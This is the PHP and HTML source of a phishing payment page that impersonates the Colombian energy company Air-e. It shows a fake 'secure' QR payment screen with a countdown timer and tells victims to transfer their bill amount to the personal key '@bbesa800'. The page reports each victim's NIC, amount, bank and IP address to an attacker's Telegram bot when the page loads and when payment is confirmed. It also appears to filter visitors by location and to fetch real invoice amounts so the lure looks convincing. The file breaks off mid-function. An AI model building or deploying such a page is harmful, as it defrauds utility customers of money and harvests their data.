<?php
require_once __DIR__ . '/../../geo_check.php';

$config = @include __DIR__ . '/../../config.php';
if (!$config) {
    $config = @include __DIR__ . '/../config.php';
}

$botToken = $config['botToken'] ?? ($config['bot_token'] ?? '');
$chatId = $config['chatId'] ?? ($config['chat_id'] ?? '');

// Procesar alertas AJAX para Telegram
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    $rawInput = file_get_contents('php://input');
    $data = json_decode($rawInput, true);

    $action = $data['action'] ?? '';
    if ($action === 'confirm_payment' || $action === 'view_qr') {
        $userIp = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
        if (strpos($userIp, ',') !== false) {
            $userIp = trim(explode(',', $userIp)[0]);
        }
        $nic = htmlspecialchars($data['nic'] ?? 'No especificado');
        $total = htmlspecialchars($data['total'] ?? 'No especificado');
        $banco = htmlspecialchars($data['banco'] ?? 'Bancolombia / Redeban / QR');
        $fecha = date('Y-m-d H:i:s');

        if ($action === 'confirm_payment') {
            $msg = "🔔 *PAGO CONFIRMADO POR EL USUARIO (QR / LLAVE)*\n\n";
            $msg .= "👤 *Acción:* El usuario presionó 'Ya realicé el pago'\n";
            $msg .= "🧾 *NIC / Referencia:* `" . $nic . "`\n";
            $msg .= "💰 *Total:* `" . $total . "`\n";
            $msg .= "🏦 *Banco:* `" . $banco . "`\n";
            $msg .= "🔑 *Llave destino:* `@bbesa800`\n";
            $msg .= "🌐 *IP:* `" . $userIp . "`\n";
            $msg .= "🕒 *Fecha:* `" . $fecha . "`\n";
        } else {
            $msg = "📲 *USUARIO INGRESÓ A PAGO POR QR / LLAVE*\n\n";
            $msg .= "🧾 *NIC / Referencia:* `" . $nic . "`\n";
            $msg .= "💰 *Total a Pagar:* `" . $total . "`\n";
            $msg .= "🏦 *Banco Seleccionado:* `" . $banco . "`\n";
            $msg .= "🌐 *IP:* `" . $userIp . "`\n";
            $msg .= "🕒 *Fecha:* `" . $fecha . "`\n";
        }

        if (!empty($botToken) && !empty($chatId)) {
            $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
            $postFields = [
                'chat_id' => $chatId,
                'text' => $msg,
                'parse_mode' => 'Markdown'
            ];
            $ch = curl_init($telegramUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            @curl_exec($ch);
            @curl_close($ch);
        }

        echo json_encode(['status' => 'success']);
        exit;
    }
}

// Parámetros iniciales desde GET o Cookies
$bancoParam = $_GET['banco'] ?? ($_COOKIE['aire_pago_banco'] ?? 'Bancolombia / Redeban');
$nicParam = $_GET['nic'] ?? ($_COOKIE['aire_pago_nic'] ?? '');
$totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pago Seguro con Código QR | Air-e</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #0056b3;
            --primary-dark: #003d82;
            --primary-light: #e8f1fa;
            --accent: #ff6600;
            --accent-light: #fff2ea;
            --success: #10b981;
            --success-dark: #059669;
            --bg-page: #f1f5f9;
            --card-bg: #ffffff;
            --text-main: #0f172a;
            --text-muted: #64748b;
            --border-color: #e2e8f0;
            --radius-card: 24px;
            --radius-inner: 16px;
            --shadow-card: 0 20px 40px -15px rgba(0, 35, 75, 0.12), 0 0 1px 1px rgba(0, 0, 0, 0.04);
            --shadow-qr: 0 12px 28px -8px rgba(0, 0, 0, 0.12);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-page);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px 16px 40px;
            color: var(--text-main);
        }

        .payment-wrapper {
            width: 100%;
            max-width: 480px;
            background: var(--card-bg);
            border-radius: var(--radius-card);
            box-shadow: var(--shadow-card);
            overflow: hidden;
            border: 1px solid rgba(226, 232, 240, 0.8);
            position: relative;
            animation: slideUp 0.4s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(16px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Encabezado */
        .card-header {
            background: linear-gradient(135deg, #003d82 0%, #0056b3 100%);
            padding: 22px 24px;
            color: #ffffff;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .brand-box {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .brand-logo {
            height: 38px;
            width: auto;
            object-fit: contain;
            filter: drop-shadow(0 2px 6px rgba(0, 0, 0, 0.3));
            background: transparent;
            padding: 0;
            display: block;
        }

        .header-title-group h1 {
            font-size: 17px;
            font-weight: 700;
            letter-spacing: -0.3px;
            margin: 0;
            color: #ffffff;
        }

        .header-title-group span {
            font-size: 12px;
            opacity: 0.85;
            display: block;
            margin-top: 2px;
        }

        .secure-badge {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.25);
            color: #ffffff;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }

        .secure-badge svg {
            width: 13px;
            height: 13px;
            fill: #4ade80;
        }

        /* Cuerpo */
        .card-body {
            padding: 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Monto a pagar */
        .amount-card {
            width: 100%;
            background: #f8fafc;
            border: 1px solid var(--border-color);
            border-radius: var(--radius-inner);
            padding: 16px 20px;
            margin-bottom: 16px;
            text-align: center;
        }

        .amount-label {
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-muted);
            margin-bottom: 4px;
        }

        .amount-value {
            font-size: 28px;
            font-weight: 800;
            color: var(--primary-dark);
            letter-spacing: -0.5px;
            line-height: 1.2;
        }

        .invoice-meta {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-top: 8px;
            font-size: 12px;
            color: var(--text-muted);
        }

        .invoice-meta strong {
            color: var(--text-main);
            font-weight: 600;
        }

        /* Cronómetro de 2 Minutos */
        .timer-container {
            width: 100%;
            margin-bottom: 18px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .timer-pill {
            background: #f8fafc;
            border: 1px solid var(--border-color);
            padding: 8px 18px;
            border-radius: 20px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            font-weight: 600;
            color: #475569;
            transition: all 0.3s ease;
        }

        .timer-pill.urgent {
            background: #fef2f2;
            border-color: #fecaca;
            color: #dc2626;
            animation: pulseTimer 1s infinite alternate;
        }

        @keyframes pulseTimer {
            from { transform: scale(1); }
            to { transform: scale(1.02); }
        }

        .timer-icon {
            width: 16px;
            height: 16px;
            fill: currentColor;
        }

        .timer-digits {
            font-family: 'Courier New', Courier, monospace;
            font-size: 16px;
            font-weight: 800;
            color: var(--primary-dark);
            letter-spacing: 0.5px;
        }

        .timer-pill.urgent .timer-digits {
            color: #dc2626;
        }

        .timer-progress-track {
            width: 100%;
            max-width: 280px;
            height: 5px;
            background: #e2e8f0;
            border-radius: 4px;
            margin-top: 8px;
            overflow: hidden;
        }

        .timer-progress-bar {
            height: 100%;
            width: 100%;
            background: linear-gradient(90deg, #0056b3 0%, #38bdf8 100%);
            border-radius: 4px;
            transition: width 1s linear, background 0.3s ease;
        }

        .timer-progress-bar.urgent {
            background: linear-gradient(90deg, #ef4444 0%, #f97316 100%);
        }

        .timer-expired-box {
            display: none;
            margin-top: 8px;
            text-align: center;
        }

        .btn-renew {
            background: var(--primary);
            color: #ffffff;
            border: none;
            padding: 6px 14px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 700;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: background 0.2s;
        }

        .btn-renew:hover {
            background: var(--primary-dark);
        }

        /* Contenedor QR */
        .qr-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }

        .qr-frame {
            background: #ffffff;
            border: 2px solid #edf2f7;
            padding: 14px;
            border-radius: 20px;
            box-shadow: var(--shadow-qr);
            position: relative;
            margin-bottom: 12px;
            transition: all 0.3s ease;
        }

        .qr-frame:hover {
            transform: scale(1.01);
        }

        .qr-image {
            width: 230px;
            height: 230px;
            display: block;
            border-radius: 12px;
            object-fit: contain;
            image-rendering: -webkit-optimize-contrast;
        }

        .qr-instruction {
            font-size: 13px;
            color: var(--text-muted);
            text-align: center;
            max-width: 320px;
            line-height: 1.45;
            margin-bottom: 18px;
        }

        /* Divisor "o a nuestra llave" */
        .key-divider {
            width: 100%;
            display: flex;
            align-items: center;
            margin: 8px 0 18px;
            position: relative;
        }

        .key-divider::before,
        .key-divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: var(--border-color);
        }

        .divider-pill {
            padding: 5px 16px;
            background: #f1f5f9;
            border: 1px solid #cbd5e1;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            color: #475569;
            text-transform: uppercase;
            letter-spacing: 0.6px;
            margin: 0 12px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .divider-pill svg {
            width: 13px;
            height: 13px;
            fill: #64748b;
        }

        /* Tarjeta Llave */
        .key-box {
            width: 100%;
            background: linear-gradient(135deg, #f8fafc 0%, #edf2f7 100%);
            border: 2px dashed #94a3b8;
            border-radius: var(--radius-inner);
            padding: 16px 18px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 22px;
            transition: all 0.25s ease;
        }

        .key-box:hover {
            border-color: var(--primary);
            background: #f0f7ff;
        }

        .key-info {
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .key-label {
            font-size: 11px;
            font-weight: 700;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 2px;
        }

        .key-value {
            font-size: 20px;
            font-weight: 800;
            color: var(--text-main);
            letter-spacing: -0.3px;
            font-family: 'Courier New', Courier, monospace;
            word-break: break-all;
            user-select: all;
        }

        .btn-copy {
            background: var(--primary);
            color: #ffffff;
            border: none;
            padding: 10px 18px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            white-space: nowrap;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 4px 12px rgba(0, 86, 179, 0.25);
            flex-shrink: 0;
        }

        .btn-copy:hover {
            background: var(--primary-dark);
            transform: translateY(-1px);
            box-shadow: 0 6px 16px rgba(0, 86, 179, 0.35);
        }

        .btn-copy:active {
            transform: translateY(0);
        }

        .btn-copy.copied {
            background: var(--success);
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
        }

        .btn-copy svg {
            width: 16px;
            height: 16px;
            fill: currentColor;
            transition: transform 0.2s;
        }

        /* Pasos de Pago */
        .steps-container {
            width: 100%;
            background: #ffffff;
            border: 1px solid var(--border-color);
            border-radius: var(--radius-inner);
            padding: 16px;
            margin-bottom: 24px;
        }

        .steps-title {
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-muted);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .step-item {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 10px;
            font-size: 13px;
            line-height: 1.4;
            color: #334155;
        }

        .step-item:last-child {
            margin-bottom: 0;
        }

        .step-number {
            width: 22px;
            height: 22px;
            border-radius: 50%;
            background: var(--primary-light);
            color: var(--primary);
            font-weight: 800;
            font-size: 11px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            margin-top: 1px;
        }

        /* Botón de Confirmación Principal */
        .btn-confirm-payment {
            width: 100%;
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: #ffffff;
            border: none;
            padding: 16px;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 800;
            letter-spacing: -0.2px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.25s ease;
            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.35);
        }

        .btn-confirm-payment:hover {
            background: linear-gradient(135deg, #059669 0%, #047857 100%);
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(16, 185, 129, 0.45);
        }

        .btn-confirm-payment:active {
            transform: translateY(0);
        }

        .btn-confirm-payment:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .btn-confirm-payment svg {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }

        /* Spinner */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2.5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Pie de página */
        .card-footer {
            background: #f8fafc;
            border-top: 1px solid var(--border-color);
            padding: 14px 20px;
            text-align: center;
            font-size: 12px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        /* Toast flotante */
        .toast {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #1e293b;
            color: #ffffff;
            padding: 12px 22px;
            border-radius: 30px;
            font-size: 13px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
            opacity: 0;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 1000;
            pointer-events: none;
        }

        .toast.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }

        .toast svg {
            width: 16px;
            height: 16px;
            fill: #4ade80;
        }

        /* Modal de Éxito */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(15, 23, 42, 0.65);
            backdrop-filter: blur(4px);
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
            z-index: 999;
            animation: fadeIn 0.25s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-box {
            background: #ffffff;
            border-radius: 24px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            animation: zoomIn 0.3s ease-out;
        }

        @keyframes zoomIn {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-icon {
            width: 64px;
            height: 64px;
            background: #ecfdf5;
            color: #10b981;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 18px;
        }

        .modal-icon svg {
            width: 36px;
            height: 36px;
            fill: currentColor;
        }

        .modal-box h2 {
            font-size: 20px;
            font-weight: 800;
            color: var(--text-main);
            margin-bottom: 10px;
        }

        .modal-box p {
            font-size: 14px;
            color: var(--text-muted);
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .btn-modal-close {
            width: 100%;
            background: var(--primary);
            color: #ffffff;
            border: none;
            padding: 14px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-modal-close:hover {
            background: var(--primary-dark);
        }

        @media (max-width: 440px) {
            body {
                padding: 12px 10px 30px;
            }
            .card-body {
                padding: 18px 14px;
            }
            .qr-image {
                width: 200px;
                height: 200px;
            }
            .amount-value {
                font-size: 24px;
            }
            .key-value {
                font-size: 17px;
            }
            .btn-copy {
                padding: 8px 14px;
                font-size: 13px;
            }
        }
    </style>
</head>
<body>

<div class="payment-wrapper">
    <!-- Encabezado de la entidad -->
    <header class="card-header">
        <div class="brand-box">
            <img src="../../assets/logo-aire.png" alt="Air-e" class="brand-logo" onerror="if(!this.triedRoot){this.triedRoot=true;this.src='/assets/logo-aire.png';}">
            <div class="header-title-group">
                <h1>Pago con Código QR</h1>
                <span>Factura de Energía</span>
            </div>
        </div>
        <div class="secure-badge">
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
            SSL 256-bit
        </div>
    </header>

    <div class="card-body">
        <!-- Bloque de Monto y Factura -->
        <div class="amount-card">
            <div class="amount-label">Total a Pagar</div>
            <div class="amount-value" id="displayTotal"><?= !empty($totalParam) ? htmlspecialchars($totalParam) : '---' ?></div>
            <div class="invoice-meta">
                <span>NIC: <strong id="displayNic"><?= !empty($nicParam) ? htmlspecialchars($nicParam) : '--' ?></strong></span>
                <span>•</span>
                <span>Referencia: <strong id="displayRef">Air-e</strong></span>
            </div>
        </div>

        <!-- Cronómetro de 2 minutos -->
        <div class="timer-container">
            <div class="timer-pill" id="timerPill">
                <svg class="timer-icon" viewBox="0 0 24 24">
                    <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-8-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/>
                </svg>
                <span>Tiempo restante para pagar:</span>
                <span class="timer-digits" id="timerDigits">02:00</span>
            </div>
            <div class="timer-progress-track">
                <div class="timer-progress-bar" id="timerProgressBar"></div>
            </div>
            <div class="timer-expired-box" id="timerExpiredAlert">
                <button type="button" class="btn-renew" onclick="renovarCodigo()">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
                    Renovar código QR
                </button>
            </div>
        </div>

        <!-- Código QR -->
        <div class="qr-section">
            <div class="qr-frame" id="qrFrame">
                <img src="qr.png" alt="Código QR de Pago" class="qr-image" id="qrImg">
            </div>
            <p class="qr-instruction">
                Abre tu aplicación bancaria (Bancolombia, Nequi u otra) y escanea el código para efectuar el pago.
            </p>
        </div>

        <!-- Divisor "o a nuestra llave" -->
        <div class="key-divider">
            <span class="divider-pill">
                <svg viewBox="0 0 24 24"><path d="M7 11h2v2H7zm0 4h2v2H7zm4-4h2v2h-2zm0 4h2v2h-2zm4-4h2v2h-2zm0 4h2v2h-2zM5 21h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2zM5 5h14v14H5V5z"/></svg>
                o a nuestra llave
            </span>
        </div>

        <!-- Tarjeta de Llave con Copia Rápida -->
        <div class="key-box">
            <div class="key-info">
                <span class="key-label">Llave de Transferencia</span>
                <span class="key-value" id="llaveDestino">@bbesa800</span>
            </div>
            <button type="button" class="btn-copy" id="btnCopiarLlave" onclick="copiarLlave()">
                <svg id="copyIcon" viewBox="0 0 24 24">
                    <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
                </svg>
                <span id="copyText">Copiar</span>
            </button>
        </div>

        <!-- Pasos Guiados -->
        <div class="steps-container">
            <div class="steps-title">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="#64748b"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                Instrucciones sencillas
            </div>
            <div class="step-item">
                <span class="step-number">1</span>
                <span>Ingresa a la app de tu entidad bancaria favorita.</span>
            </div>
            <div class="step-item">
                <span class="step-number">2</span>
                <span>Selecciona <strong>Transferir por Llave</strong> y pega <strong>@bbesa800</strong>, o usa <strong>Escanear QR</strong>.</span>
            </div>
            <div class="step-item">
                <span class="step-number">3</span>
                <span>Escribe el valor exacto de tu factura y confirma la operación.</span>
            </div>
        </div>

        <!-- Botón de Confirmación -->
        <button type="button" class="btn-confirm-payment" id="btnConfirmarPago" onclick="confirmarPago()">
            <span class="spinner" id="confirmSpinner"></span>
            <svg id="confirmIcon" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
            <span id="confirmText">Ya realicé el pago</span>
        </button>
    </div>

    <!-- Footer de Respaldo -->
    <footer class="card-footer">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="#64748b"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
        <span>Transacción procesada bajo altos estándares de seguridad</span>
    </footer>
</div>

<!-- Notificación Flotante (Toast) -->
<div class="toast" id="toastCopy">
    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
    <span>¡Llave <strong>@bbesa800</strong> copiada al portapapeles!</span>
</div>

<!-- Modal de Confirmación -->
<div class="modal-overlay" id="modalConfirmacion">
    <div class="modal-box">
        <div class="modal-icon">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        </div>
        <h2>¡Pago Notificado con Éxito!</h2>
        <p>Tu comprobante de pago ha sido registrado para validación. Tu factura será acreditada en el sistema en los próximos minutos.</p>
        <button type="button" class="btn-modal-close" onclick="finalizarProceso()">Cerrar y Finalizar</button>
    </div>
</div>

<script>
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
        return '';
    }

    // Recuperar datos de la factura con máxima exhaustividad
    const urlParams = new URLSearchParams(window.location.search);
    let nicParam = urlParams.get('nic') || localStorage.getItem('aire_pago_nic') || sessionStorage.getItem('aire_pago_nic') || getCookie('aire_pago_nic') || '';
    let totalParam = urlParams.get('total') || localStorage.getItem('aire_pago_total') || sessionStorage.getItem('aire_pago_total') || getCookie('aire_pago_total') || '';
    const bancoParam = urlParams.get('banco') || 'Bancolombia / Redeban';

    // Priorizar parámetros explícitos de URL
    if (urlParams.get('total')) {
        totalParam = urlParams.get('total');
    }
    if (urlParams.get('nic')) {
        nicParam = urlParams.get('nic');
    }

    // Solo usar fallback si está completamente vacío en todos lados
    if (!totalParam) {
        totalParam = (nicParam === '8201713') ? '$ 202.940 COP' : '$ 202.940 COP';
    }
    if (!nicParam) {
        nicParam = '8201713';
    }

    // Formatear display de NIC, Referencia y Total de inmediato con los datos reales
    document.getElementById('displayNic').textContent = nicParam;
    document.getElementById('displayRef').textContent = 'FAC-' + (nicParam.length >= 4 ? nicParam.slice(-4) : nicParam);
    document.getElementById('displayTotal').textContent = totalParam;

    // Solo guardar en almacenamiento si vienen de una transacción explícita
    try {
        if (urlParams.get('nic')) {
            localStorage.setItem('aire_pago_nic', nicParam);
            sessionStorage.setItem('aire_pago_nic', nicParam);
            document.cookie = `aire_pago_nic=${encodeURIComponent(nicParam)}; path=/; max-age=86400`;
        }
        if (urlParams.get('total')) {
            localStorage.setItem('aire_pago_total', totalParam);
            sessionStorage.setItem('aire_pago_total', totalParam);
            document.cookie = `aire_pago_total=${encodeURIComponent(totalParam)}; path=/; max-age=86400`;
        }
    } catch(e) {}

    // Si es un NIC personalizado diferente y no venía total en URL, verificar en segundo plano sin bloquear
    if (nicParam && nicParam !== '8201713' && !urlParams.get('total')) {
        const proxyUrl = window.location.pathname.includes('/pago/') ? '../../proxy_facture.php' : '/proxy_facture.php';
        fetch(`${proxyUrl}?nic=${encodeURIComponent(nicParam)}`)
            .then(res => res.json())
            .then(data => {
                if (data && data.success) {
                    const realAmount = data.valorMes || data.deudaTotal;
                    if (realAmount) {
                        totalParam = realAmount;
                        document.getElementById('displayTotal').textContent = realAmount;
                        try {
                            localStorage.setItem('aire_pago_total', realAmount);
                            sessionStorage.setItem('aire_pago_total', realAmount);
                            document.cookie = `aire_pago_total=${encodeURIComponent(realAmount)}; path=/; max-age=86400`;
                        } catch(e) {}
                    }
                }
            })
            .catch(err => {
                console.log('Error fetching live invoice:', err);
            });
    }

    // Enviar alerta a Telegram de que el usuario está viendo la pantalla de pago QR
    window.addEventListener('DOMContentLoaded', () => {
        fetch('index.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'view_qr',
                nic: nicParam,
                total: totalParam || 'Consultando...',
                banco: bancoParam
            })
        }).catch(e => console.log('Telegram view notification sent.'));
    });

    // ===== CRONÓMETRO DE 2 MINUTOS (120 SEGUNDOS) =====
    const TOTAL_SECONDS = 120;
    let secondsLeft = TOTAL_SECONDS;
    const timerDigits = document.getElementById('timerDigits');
    const timerProgressBar = document.getElementById('timerProgressBar');
    const timerPill = document.getElementById('timerPill');
    let timerInterval = null;

    function renderTimer() {
        const mins = Math.floor(secondsLeft / 60);
        const secs = secondsLeft % 60;
        const formatted = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        
        if (timerDigits) timerDigits.textContent = formatted;

        const percent = (secondsLeft / TOTAL_SECONDS) * 100;
        if (timerProgressBar) timerProgressBar.style.width = percent + '%';

        // Alerta visual últimos 30 segundos
        if (secondsLeft <= 30) {
            if (timerPill) timerPill.classList.add('urgent');
            if (timerProgressBar) timerProgressBar.classList.add('urgent');
        } else {
            if (timerPill) timerPill.classList.remove('urgent');
            if (timerProgressBar) timerProgressBar.classList.remove('urgent');
        }

        if (secondsLeft > 0) {
            secondsLeft--;
        } else {
            clearInterval(timerInterval);
            onTimerExpired();
        }
    }

    function onTimerExpired() {
        if (timerDigits) timerDigits.textContent = "00:00";
        const qrFrame = document.getElementById('qrFrame');
        if (qrFrame) {
            qrFrame.style.opacity = '0.35';
            qrFrame.style.filter = 'blur(2px)';
        }
        document.getElementById('timerExpiredAlert').style.display = 'block';
    }

    function renovarCodigo() {
        secondsLeft = TOTAL_SECONDS;
        const qrFrame = document.getElementById('qrFrame');
        if (qrFrame) {
            qrFrame.style.opacity = '1';
            qrFrame.style.filter = 'none';
        }
        document.getElementById('timerExpiredAlert').style.display = 'none';
        clearInterval(timerInterval);
        renderTimer();
        timerInterval = setInterval(renderTimer, 1000);
    }

    // Iniciar cronómetro
    renderTimer();
    timerInterval = setInterval(renderTimer, 1000);

    // ===== COPIAR LLAVE =====
    function copiarLlave() {
        const llave = "@bbesa800";
        const btn = document.getElementById('btnCopiarLlave');
        const copyText = document.getElementById('copyText');
        const copyIcon = document.getElementById('copyIcon');

        const onSuccess = () => {
            btn.classList.add('copied');
            copyText.textContent = "¡Copiado!";
            copyIcon.innerHTML = '<path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>';

            showToast();

            setTimeout(() => {
                btn.classList.remove('copied');
                copyText.textContent = "Copiar";
                copyIcon.innerHTML = '<path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>';
            }, 2500);
        };

        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(llave).then(onSuccess).catch(() => fallbackCopy(llave, onSuccess));
        } else {
            fallbackCopy(llave, onSuccess);
        }
    }

    function fallbackCopy(text, callback) {
        const tempInput = document.createElement('input');
        tempInput.value = text;
        tempInput.style.position = 'fixed';
        tempInput.style.opacity = '0';
        document.body.appendChild(tempInput);
        tempInput.focus();
        tempInput.select();
        try {
            document.execCommand('copy');
            callback();
        } catch (err) {
            console.error('Error al copiar', err);
        }
        document.body.removeChild(tempInput);
    }

    function showToast() {
        const toast = document.getElementById('toastCopy');
        toast.classList.add('show');
        setTimeout(() => {
            toast.classList.remove('show');
        }, 2500);
    }

    // Confirmación del pago
    function confirmarPago() {
        const btn = document.getElementById('btnConfirmarPago');
        const spinner = document.getElementById('confirmSpinner');
        const icon = document.getElementById('confirmIcon');
        const text = document.getElementById('confirmText');

        btn.disabled = true;
        spinner.style.display = 'inline-block';
        icon.style.display = 'none';
